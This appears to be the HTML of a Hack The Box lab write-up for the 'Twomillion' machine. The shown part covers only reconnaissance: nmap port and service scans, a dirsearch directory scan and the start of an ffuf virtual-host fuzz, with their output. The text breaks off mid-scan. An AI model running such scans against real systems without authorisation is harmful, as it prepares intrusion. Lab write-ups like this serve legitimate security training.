@@ -1,0 +1,641 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.60856f0f2ed73fb3cd2820ee548c4698ffbc4d743736e852c0e27ce4f52dfd9c.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=/favicon.png>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">sysevil - Twomillion</title>
+<meta property="og:title" content=sysevil&#32;-&#32;Twomillion />
+<meta name="twitter:title" content=sysevil&#32;-&#32;Twomillion />
+<meta itemprop="name" content=sysevil&#32;-&#32;Twomillion />
+<meta name="application-name" content=sysevil&#32;-&#32;Twomillion />
+<meta property="og:site_name" content="" />
+
+
+<meta name="description" content="" />
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+
+<base href="https://sysevil.github.io/htb/twomillion/" />
+<link rel="canonical" href="https://sysevil.github.io/htb/twomillion/" itemprop="url" />
+<meta name="url" content="https://sysevil.github.io/htb/twomillion/" />
+<meta name="twitter:url" content="https://sysevil.github.io/htb/twomillion/" />
+<meta property="og:url" content="https://sysevil.github.io/htb/twomillion/" />
+
+
+<meta property="og:updated_time" content=15002-15-08T218:14:24-0300 />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='https://sysevil.github.io/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+<meta name="twitter:site" content="https://twitter.com/sys3vil" />
+<meta name="twitter:creator" content="https://twitter.com/sys3vil" />
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta name="generator" content="   ">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5A5A5A;
+        --link-color: #268BD2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #000;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #EEE;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9D9D9D;
+        --link-color: #268BD2;
+        --date-color: #9A9A9A;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #FFF;
+        --code-background-color: #515151;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="dark-theme">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="https://sysevil.github.io">
+                <img src="https://avatars.githubusercontent.com/u/101719434?s=400&amp;u=42dd79d45b84aeba378d735e6b54c8e5e1b92316&amp;v=4" alt="brand image">
+            </a>
+        
+        
+            <a href="https://sysevil.github.io">
+                <h1>sysevil</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    I am a (security|dev) researcher focus on 👁️🪲
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+            
+            
+                
+                
+            
+                
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+            
+                
+                
+            
+                
+                
+            
+        
+        
+            
+
+            
+                
+                
+                    <li class="heading">
+                        <a href="/htb/">HTB</a>
+                    </li>
+                    
+                        <li class="sub-heading">
+                            Recent
+                        </li>
+                        
+                            <li class="bullet">
+                                <a href="https://sysevil.github.io/htb/twomillion/">Twomillion</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://sysevil.github.io/htb/devvortex/">Devvortex</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://sysevil.github.io/htb/busqueda/">Busqueda</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://sysevil.github.io/htb/builder/">Builder</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://sysevil.github.io/htb/bizness/">Bizness</a>
+                            </li>
+                        
+                    
+                
+            
+            
+                
+                
+            
+                
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+            
+                
+                
+            
+                
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+    <a target="_blank" class="social" title="GitHub" href="https://github.com/sysevil">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+
+
+    <a target="_blank" class="social" title="Twitter" href="https://twitter.com/sys3vil">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M5.032 14.286c6.037 0 9.34-4.837 9.34-9.032c0-.137 0-.274-.01-.41A6.56 6.56 0 0 0 16 3.2c-.6.256-1.235.425-1.885.5a3.207 3.207 0 0 0 1.443-1.757c-.645.37-1.35.63-2.085.77a3.322 3.322 0 0 0-1.862-.958a3.384 3.384 0 0 0-2.082.334a3.223 3.223 0 0 0-1.442 1.49a3.08 3.08 0 0 0-.208 2.03a9.57 9.57 0 0 1-3.747-.963a9.269 9.269 0 0 1-3.018-2.354a3.086 3.086 0 0 0-.36 2.314c.189.787.68 1.475 1.376 1.924a3.344 3.344 0 0 1-1.49-.398v.04c0 .734.263 1.444.743 2.01a3.3 3.3 0 0 0 1.89 1.102c-.483.128-.99.146-1.482.055a3.19 3.19 0 0 0 1.168 1.577a3.36 3.36 0 0 0 1.9.627A6.732 6.732 0 0 1 0 12.86a9.527 9.527 0 0 0 5.032 1.423"/>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+    <a target="_blank" class="social" title="RSS Feed" href="/posts/index.xml">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 1280.000000 1280.000000">
+            <g transform="translate(0.000000,1280.000000) scale(0.100000,-0.100000)" fill="currentColor">
+                <path d="M2295 11929 c-284 -12 -642 -45 -707 -65 -17 -5 -18 -63 -18 -1039 0 -569 4 -1036 8 -1039 5 -3 74 6 153 19 510 86 1168 95 1789 25 1348 -153 2602 -677 3670 -1531 385 -308 820 -744 1126 -1129 842 -1060 1362 -2313 1514 -3650 70 -621 61 -1279 -25 -1789 -13 -79 -22 -148 -19 -153 3 -4 471 -8 1039 -8 l1035 0 5 23 c51 225 85 942 67 1419 -23 605 -77 1044 -198 1617 -294 1400 -927 2734 -1823 3846 -1043 1295 -2364 2259 -3909 2854 -1158 447 -2451 656 -3707 600z"/>
+                <path d="M2255 7845 c-269 -25 -620 -81 -667 -106 -17 -9 -18 -55 -18 -899 0 -706 3 -890 13 -890 6 0 66 18 132 41 130 44 288 79 467 105 154 21 577 30 749 15 1207 -107 2267 -823 2814 -1902 166 -327 268 -637 330 -1001 38 -227 48 -384 42 -662 -8 -348 -44 -590 -126 -831 -23 -66 -41 -126 -41 -132 0 -10 184 -13 890 -13 844 0 890 1 899 18 27 50 88 452 110 725 14 162 14 624 1 782 -59 703 -233 1323 -545 1945 -481 956 -1313 1788 -2270 2268 -620 310 -1239 483 -1940 542 -165 14 -669 10 -840 -5z"/>
+                <path d="M2519 3815 c-391 -66 -725 -336 -868 -703 -79 -201 -96 -462 -45 -677 83 -344 338 -641 666 -774 116 -47 205 -69 330 -80 412 -39 811 153 1040 500 193 292 240 648 128 981 -135 403 -492 699 -914 757 -100 14 -241 12 -337 -4z"/>
+            </g>
+        </svg>
+    </a>
+
+
+    <a target="_blank" class="social" title="Email" href="mailto://sysevil.sec@gmail.com">
+       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
+            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
+       </svg>
+    </a>
+
+
+        <p class="footnote">
+powered by <a target="_blank" href="https://localhost!.io"> </a> | themed with <a target="_blank" href="https://github.com/lukeorth/sysevil">sysevil</a>
+    <br>
+    &copy; 2024 . All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="https://sysevil.github.io/htb/twomillion/">Twomillion</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      <time datetime=" 2024-02-15T08:18:14-0300" class="post-date">
+        February 15, 2024
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>5 mins read</span>
+      </span>
+    </div>
+
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <p>author: sysevil</p>
+<hr>
+<p>OS: Linux
+Difficult: Easy</p>
+<h4 id="port-scanner">Port Scanner</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -p- -v -oG fullscan -T4 10.10.11.221
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-02-14 18:19 -03
+</span></span><span style="display:flex;"><span>Initiating Ping Scan at 18:19
+</span></span><span style="display:flex;"><span>Scanning 10.10.11.221 <span style="color:#f92672">[</span><span style="color:#ae81ff">4</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Completed Ping Scan at 18:19, 0.15s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 18:19
+</span></span><span style="display:flex;"><span>Scanning 2million.htb <span style="color:#f92672">(</span>10.10.11.221<span style="color:#f92672">)</span> <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.10.11.221
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 10.10.11.221
+</span></span><span style="display:flex;"><span>SYN Stealth Scan Timing: About 22.34% <span style="color:#66d9ef">done</span>; ETC: 18:21 <span style="color:#f92672">(</span>0:01:48 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SYN Stealth Scan Timing: About 40.95% <span style="color:#66d9ef">done</span>; ETC: 18:21 <span style="color:#f92672">(</span>0:01:28 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SYN Stealth Scan Timing: About 56.54% <span style="color:#66d9ef">done</span>; ETC: 18:22 <span style="color:#f92672">(</span>0:01:10 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 18:22, 153.85s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 2million.htb <span style="color:#f92672">(</span>10.10.11.221<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp open  ssh
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 154.11 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">69757</span> <span style="color:#f92672">(</span>3.069MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">79462</span> <span style="color:#f92672">(</span>5.171MB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                                                            
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>parallels㉿kali-gnu-linux-2023<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/htb/machines/2Milllion<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap -p 22,80 -sV -A  -oG fullscanHTTP -T4 10.10.11.221
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-02-14 18:27 -03
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 2million.htb <span style="color:#f92672">(</span>10.10.11.221<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx
+</span></span><span style="display:flex;"><span>| http-cookie-flags: 
+</span></span><span style="display:flex;"><span>|   /: 
+</span></span><span style="display:flex;"><span>|     PHPSESSID: 
+</span></span><span style="display:flex;"><span>|_      httponly flag not set
+</span></span><span style="display:flex;"><span>|_http-title: Hack The Box :: Penetration Testing Labs
+</span></span><span style="display:flex;"><span>|_http-trane-info: Problem with XML parsing of /evox/about
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Linux 5.0 <span style="color:#f92672">(</span>97%<span style="color:#f92672">)</span>, Linux 4.15 - 5.8 <span style="color:#f92672">(</span>96%<span style="color:#f92672">)</span>, Linux 5.3 - 5.4 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 2.6.32 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 5.0 - 5.5 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 3.1 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 3.2 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, AXIS 210A or <span style="color:#ae81ff">211</span> Network Camera <span style="color:#f92672">(</span>Linux 2.6.17<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, ASUS RT-N56U WAP <span style="color:#f92672">(</span>Linux 3.4<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Linux 3.16 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TRACEROUTE <span style="color:#f92672">(</span>using port 22/tcp<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>HOP RTT       ADDRESS
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   129.17 ms 10.10.14.1 <span style="color:#f92672">(</span>10.10.14.1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>   130.94 ms 2million.htb <span style="color:#f92672">(</span>10.10.11.221<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 15.32 seconds
+</span></span></code></pre></div><h4 id="dir-scanner">Dir Scanner</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dirsearch -u  http://2million.htb -e php,asp,aspx,jsp,md,text,bak,zip,toml,conf
+</span></span><span style="display:flex;"><span>  _|. _ _  _  _  _ _|_    v0.4.3
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">(</span>_<span style="color:#f92672">||</span>| _<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>/_<span style="color:#f92672">(</span>_<span style="color:#f92672">||</span> <span style="color:#f92672">(</span>_| <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Extensions: php, asp, aspx, jsp, md, text, bak, zip, toml, conf | HTTP method: GET | Threads: <span style="color:#ae81ff">25</span> | Wordlist size: <span style="color:#ae81ff">14139</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Output File: /home/parallels/reports/http_2million.htb/_24-02-14_18-21-08.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target: http://2million.htb/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>18:21:08<span style="color:#f92672">]</span> Starting: 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>18:21:20<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    2KB - /404                                              
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>18:21:39<span style="color:#f92672">]</span> <span style="color:#ae81ff">401</span> -    0B  - /api                                              
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>18:21:39<span style="color:#f92672">]</span> <span style="color:#ae81ff">401</span> -    0B  - /api/v1                                           
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>18:21:40<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  162B  - /assets  -&gt;  http://2million.htb/assets/          
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>18:21:40<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  548B  - /assets/                                          
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>18:21:47<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  548B  - /controllers/                                     
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>18:21:48<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  162B  - /css  -&gt;  http://2million.htb/css/                
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>18:21:54<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  162B  - /fonts  -&gt;  http://2million.htb/fonts/            
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>18:21:56<span style="color:#f92672">]</span> <span style="color:#ae81ff">302</span> -    0B  - /home  -&gt;  /                                      
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>18:21:57<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  548B  - /images/                                          
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>18:21:57<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  162B  - /images  -&gt;  http://2million.htb/images/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>18:22:00<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  548B  - /js/                                              
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>18:22:00<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  162B  - /js  -&gt;  http://2million.htb/js/                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>18:22:02<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    4KB - /login                                            
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>18:22:02<span style="color:#f92672">]</span> <span style="color:#ae81ff">302</span> -    0B  - /logout  -&gt;  /                                    
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>18:22:15<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    4KB - /register                                         
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>18:22:27<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  162B  - /views  -&gt;  http://2million.htb/views/       
+</span></span></code></pre></div><ul>
+<li><code>/register/</code> is open</li>
+</ul>
+<h4 id="vhost-scanner">Vhost scanner</h4>
+<blockquote>
+<p>nothing.. here&hellip;</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> ffuf -u http://2million.htb -H <span style="color:#e6db74">&#34;Host: FUZZ.2million.htb&#34;</span>  -w /usr/share/wordlists/amass/subdomains.lst -fs <span style="color:#ae81ff">5</span> -mc <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       v2.1.0-dev
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> :: Method           : GET
+</span></span><span style="display:flex;"><span> :: URL              : http://2million.htb
+</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/wordlists/amass/subdomains.lst
+</span></span><span style="display:flex;"><span> :: Header           : Host: FUZZ.2million.htb
+</span></span><span style="display:flex;"><span> :: Follow redirects : false
+</span></span><span style="display:flex;"><span> :: Calibration      : false
+</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span> :: Matcher          : Response status: <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span> :: Filter           : Response size: <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
